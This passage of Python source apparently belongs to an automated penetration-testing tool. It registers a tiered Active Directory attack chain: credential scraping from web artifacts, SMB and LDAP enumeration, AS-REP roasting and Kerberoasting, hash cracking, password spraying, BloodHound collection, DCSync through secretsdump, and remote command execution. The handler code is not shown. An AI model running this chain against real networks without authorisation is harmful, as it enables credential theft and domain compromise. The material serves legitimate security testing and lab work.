    ))

    # Downloadable-artifact secret scan — one instance per web service. Fetches
    # .jar/.zip/.war/.config/.sql artifacts and scrapes credential literals into
    # cred candidates for the reuse spray.
    reg.register(Action(
        "web.artifact_secrets", Tier.GREEN, _h_artifact_secrets,
        group="web", order=2,
        footprint=Footprint(
            summary="download .jar/.zip/.war/.config/.sql artifacts and scan for "
                    "hardcoded credential literals (→ reuse-spray candidates)",
            network="artifact-name probes + a focused ffuf bust — visible in web logs"),
        gate=lambda f: any(s.is_web for s in f.get_services()),
        instances=_web_instances,
        requires=(Requirement("service", "a detected web service (run svc.version_detect)"),),
        deps=("curl",),
    ))

    # Non-AD service enumeration — one instance per detected service the legacy
    # dispatcher knows (databases, DNS, SNMP, mail, RDP, NFS, Docker, Redis, …).
    # AD/creds ports are covered by their own branches and skipped here.
    reg.register(Action(
        "service.enum", Tier.GREEN, _h_service_enum,
        group="service", order=1,
        footprint=Footprint(
            summary="protocol-specific enumeration for non-AD services "
                    "(databases, DNS, SNMP, mail, RDP, NFS, Docker, Redis, …)"),
        gate=lambda f: bool(_service_instances(f)),
        instances=_service_instances,
        requires=(Requirement("service", "a detected non-AD service (run svc.version_detect)"),),
    ))

    # IKE/IPsec — when ISAKMP (udp/500) is up, fingerprint + probe aggressive mode.
    # The whole foothold can live here (Expressway): the aggressive-mode reply
    # leaks an ID (→ user/domain) and a PSK hash (→ crack.hashes → reuse spray).
    reg.register(Action(
        "ike.enum", Tier.GREEN, _h_ike_enum,
        group="ike", order=1,
        footprint=Footprint(
            summary="ISAKMP fingerprint + IKEv1 aggressive-mode probe — leaks ID "
                    "payload (user/domain) and a crackable PSK hash",
            network="ISAKMP probes + an aggressive-mode handshake request to udp/500"),
        gate=lambda f: f.has("udp/500"),
        requires=(Requirement("udp/500", "ISAKMP (udp/500) open"),),
        deps=("ike-scan",),
    ))

    # Anonymous SMB, decomposed into cohesive sub-actions. `run smb` runs the
    # whole branch; each is also individually runnable.
    _smb_gate = lambda f: f.has("tcp/445")          # noqa: E731
    _smb_req = (Requirement("tcp/445", "SMB (tcp/445) open"),)
    _smb_evt = Footprint(windows_events=("4624 (type 3, often below audit)",))
    reg.register(Action(
        "smb.users", Tier.GREEN, _h_smb_users, group="smb", order=1,
        footprint=Footprint(summary="anonymous SMB: RID cycle + --users (domain roster)",
                            windows_events=_smb_evt.windows_events),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
        supersedes=("smb.enum4linux",),     # no-overlap: covers enum4linux ground
    ))
    reg.register(Action(
        "smb.shares", Tier.GREEN, _h_smb_shares, group="smb", order=2,
        footprint=Footprint(summary="anonymous / Guest share access"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))
    reg.register(Action(
        "smb.spider", Tier.GREEN, _h_smb_spider, group="smb", order=3,
        footprint=Footprint(summary="recursively list/download files from readable shares"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))
    reg.register(Action(
        "smb.policy", Tier.GREEN, _h_smb_policy, group="smb", order=4,
        footprint=Footprint(summary="domain password / lockout policy (safe-to-spray signal)"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))
    reg.register(Action(
        "smb.signing", Tier.GREEN, _h_smb_signing, group="smb", order=5,
        footprint=Footprint(
            summary="SMB signing posture — identifies NTLM-relay targets (recon, not relay)"),
        gate=_smb_gate, requires=_smb_req, deps=("nxc",),
    ))

    # Anonymous LDAP, decomposed into cohesive sub-actions. `run ldap` runs the
    # whole branch; each is also individually runnable. All gated on an LDAP port,
    # and suppressed once the branch is ANON_DENIED (waits for a cred / recheck).
    _ldap_gate = lambda f: _ldap_port(f) is not None        # noqa: E731
    _ldap_req = (Requirement("ldap_port", "LDAP (tcp/389|636|3268|3269) open"),)
    for _name, _order, _h, _desc in (
        ("ldap.domain_info", 1, _h_ldap_domain_info,
         "anonymous LDAP: base DN, password policy, computers"),
        ("ldap.users", 2, _h_ldap_users,
         "anonymous LDAP: domain users + AS-REP-roastable accounts"),
        ("ldap.groups", 3, _h_ldap_groups,
         "anonymous LDAP: groups + privileged (adminCount) accounts"),
        ("ldap.delegation", 4, _h_ldap_delegation,
         "anonymous LDAP: unconstrained / constrained delegation"),
    ):
        reg.register(Action(
            _name, Tier.GREEN, _h, group="ldap", order=_order,
            footprint=Footprint(summary=_desc),
            gate=_ldap_gate, requires=_ldap_req, deps=("ldapsearch",),
            suppressed_by=(ProtoStatus.ANON_DENIED,),
        ))

    reg.register(Action(
        "kerberos.userenum", Tier.YELLOW, _h_userenum,
        group="kerberos", order=0,
        footprint=Footprint(
            summary="validate the user list against the KDC (kerbrute)",
            windows_events=("4768 (TGT requested)", "4771 (pre-auth failed)"),
        ),
        gate=lambda f: f.has("domain") and f.has("users"),
        requires=(Requirement("domain", "a domain"),
                  Requirement("users", "a user list")),
        deps=("kerbrute",),
    ))
    reg.register(Action(
        "kerberos.asrep_roast", Tier.YELLOW, _h_asrep_roast,
        group="kerberos", order=1,
        footprint=Footprint(
            summary="AS-REP roast: one AS-REQ (no pre-auth) per known user",
            windows_events=("4768 (TGT requested)", "4771 (pre-auth failed)"),
        ),
        gate=lambda f: f.has("domain") and f.has("users"),
        requires=(Requirement("domain", "a domain"),
                  Requirement("users", "a user list")),
        deps=("impacket-GetNPUsers",),
    ))

    reg.register(Action(
        "crack.hashes", Tier.PASSIVE, _h_crack,
        group="creds", order=1,
        footprint=Footprint(
            summary="offline crack of uncracked hashes — hashcat+rockyou "
                    "(AS-REP/Kerberoast/NTLM) or psk-crack (IKE PSK); local only"),
        gate=lambda f: f.has("hash:uncracked"),
        requires=(Requirement("hash:uncracked", "an uncracked hash"),),
        # No hard tool dep: the handler picks hashcat or psk-crack per hash type,
        # so an IKE-PSK-only box still cracks without hashcat installed.
    ))

    reg.register(Action(
        "creds.test", Tier.YELLOW, _h_creds_test,
        group="creds", order=2,
        footprint=Footprint(
            summary="verify known credential pair(s) for access across every open "
                    "auth surface (SMB/WinRM/SSH/RDP/MSSQL) — not a spray",
            windows_events=("4624 (logon) on a hit", "4625 (failed logon)"),
        ),
        gate=lambda f: (f.has("cred_pair") or f.has("valid_cred")) and _auth_surface(f),
        requires=(Requirement("cred_pair", "a credential pair (cracked/known)"),
                  Requirement("auth_surface", "an open auth service (SMB/WinRM/SSH/RDP/MSSQL)")),
        rearm_on=("cred_pair", "valid_cred"),
        deps=("nxc",),
    ))

    reg.register(Action(
        "creds.spray", Tier.YELLOW, _h_creds_spray,
        group="creds", order=3,
        footprint=Footprint(
            summary="spray candidate password(s) across the whole user list on every "
                    "discovered auth surface (SMB/WinRM/SSH)",
            windows_events=("4625 (failed logon)", "4624 (logon) on a hit"),
        ),
        gate=lambda f: f.has("cred") and _auth_surface(f),
        requires=(Requirement("cred", "a candidate password (cracked/leaked)"),
                  Requirement("auth_surface", "an open auth service (SMB/WinRM/SSH)")),
        # A newly-landed secret re-arms the spray so it genuinely re-triggers.
        rearm_on=("cred",),
        deps=("nxc",),
    ))

    # Authenticated AD enumeration, decomposed into one-decision-per-action steps
    # (replacing the monolithic ad.authenticated_core). All gated valid_cred+domain.
    _authed = lambda f: f.has("valid_cred") and f.has("domain")  # noqa: E731
    _authed_reqs = (Requirement("valid_cred", "a valid credential"),
                    Requirement("domain", "a domain"))

    reg.register(Action(
        "ldap.domaindump", Tier.YELLOW, _h_ldap_domaindump,
        group="ldap", order=2,
        footprint=Footprint(
            summary="authenticated LDAP dump + enrichment (delegation/MAQ/policy)",
            windows_events=("4662 (directory reads)",)),
        gate=_authed, requires=_authed_reqs, deps=("ldapdomaindump",),
    ))
    reg.register(Action(
        "kerberos.kerberoast", Tier.YELLOW, _h_kerberoast,
        group="kerberos", order=2,
        footprint=Footprint(
            summary="request TGS for SPN accounts → crackable hashes",
            windows_events=("4769 (TGS requested)",)),
        gate=_authed, requires=_authed_reqs, deps=("impacket-GetUserSPNs",),
    ))
    reg.register(Action(
        "bloodhound.collect", Tier.YELLOW, _h_bloodhound,
        group="ad", order=1,
        footprint=Footprint(
            summary="BloodHound collection (All, DCOnly fallback) → attack paths",
            windows_events=("4662 (directory reads)",)),
        gate=_authed, requires=_authed_reqs, deps=("bloodhound-python",),
    ))
    reg.register(Action(
        "ad.writable_objects", Tier.YELLOW, _h_writable_objects,
        group="ad", order=2,
        footprint=Footprint(
            summary="enumerate writable users/groups/computers (privesc targets)"),
        gate=_authed, requires=_authed_reqs, deps=("bloodyAD",),
    ))
    reg.register(Action(
        "ad.adcs_enum", Tier.YELLOW, _h_adcs_enum,
        group="ad", order=3,
        footprint=Footprint(
            summary="enumerate vulnerable ADCS certificate templates (recon, not ESC abuse)"),
        gate=_authed, requires=_authed_reqs, deps=("certipy-ad",),
    ))
    reg.register(Action(
        "ad.coerce_surface", Tier.GREEN, _h_coerce_surface,
        group="ad", order=4,
        footprint=Footprint(
            summary="detect NTLM-coercion RPC endpoints (PrinterBug/PetitPotam/DFSCoerce) "
                    "— relay-target recon, not coercion"),
        gate=lambda f: f.has("tcp/135"),
        requires=(Requirement("tcp/135", "MSRPC (tcp/135) open"),),
        deps=("impacket-rpcdump",),
    ))
    reg.register(Action(
        "mssql.enum", Tier.YELLOW, _h_mssql_enum,
        group="service", order=2,
        footprint=Footprint(
            summary="authenticated MSSQL enum — databases + linked servers (lateral surface)"),
        gate=lambda f: f.has("tcp/1433") and f.has("valid_cred"),
        requires=(Requirement("tcp/1433", "MSSQL (tcp/1433) open"),
                  Requirement("valid_cred", "a valid credential")),
        deps=("nxc",),
    ))
    reg.register(Action(
        "creds.secretsdump", Tier.YELLOW, _h_secretsdump,
        group="creds", order=4,
        manual_only=True,          # DCSync is never automatic — explicit run_action only
        footprint=Footprint(
            summary="DCSync NTLM hashes via secretsdump (-just-dc-ntlm) — admin or "
                    "replication rights; captures hashes for crack/PtH, not a shell",
            windows_events=("4662 (DRSUAPI replication)",)),
        gate=_authed, requires=_authed_reqs, deps=("impacket-secretsdump",),
    ))

    reg.register(Action(
        "access.exec", Tier.YELLOW, _h_exec,
        group="access", order=1,
        manual_only=True,          # only ever via an explicit run (needs a command)
        footprint=Footprint(
            summary="run ONE command non-interactively via a known credential "
                    "(nxc -x / sshpass); captures stdout — not a shell, not C2",
            windows_events=("4624/4672 (logon)", "7045 (service exec)")),
        gate=_can_exec,
        requires=(Requirement("valid_cred", "a valid credential"),
                  Requirement("tcp/5985", "WinRM (5985/5986) / admin SMB (445) / SSH (22)")),
    ))

    return reg
